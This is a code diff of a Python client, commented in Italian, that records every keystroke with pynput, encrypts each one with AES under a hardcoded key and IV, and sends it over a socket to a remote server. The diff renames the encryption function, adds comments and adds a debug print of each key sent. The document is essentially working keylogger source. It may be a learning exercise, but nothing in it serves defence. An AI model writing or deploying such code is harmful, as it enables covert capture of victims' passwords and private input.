@@ -1,14 +1,13 @@
 # Client Program
-import socket
+import socket # Libreria per la creazione e gestione di socket
 from pynput.keyboard import Listener #Libreria per leggere i caratteri digitati sulla tastiera
-import time
+import time # Libreria contenente funzioni legate al tempo
+from Crypto.Cipher import AES # Algoritmo di crittografia a chiave simmetrica
 
-from Crypto.Cipher import AES
-
-def do_encrypt(message: str):
-    obj = AES.new(b'Fm!t%68Hava!wq&)', AES.MODE_CFB, b'Fh78&rsV2!894R6$')
-    ciphertext = obj.encrypt(message.encode())
-    return ciphertext
+def encryptData(textToEncrypt: str):
+    aes = AES.new(b'Fm!t%68Hava!wq&)', AES.MODE_CFB, b'Fh78&rsV2!894R6$')
+    encryptedText = aes.encrypt(textToEncrypt.encode())
+    return encryptedText
 
 
 connected = False 
@@ -27,9 +26,10 @@ while not connected:
 
         # Funzione che si occupa di inviare il carattere digitato.
         def on_press(key):
-            clientSocket.send(do_encrypt(str(key)))
+            print("  |> Invio (%s > %s)" % (str(key), encryptData(str(key))))
+            clientSocket.send(encryptData(str(key)))
 
-        # Creo un istanza di un listener che registra tutte le pressioni dei tasti.
+        # Creo un'istanza di un listener che registra tutte le pressioni dei tasti.
         # Il costruttore prende la funzione creata e usa il metodo join per joinare l'istanza nel thread principale.
         try:
             with Listener(on_press=on_press) as listener:
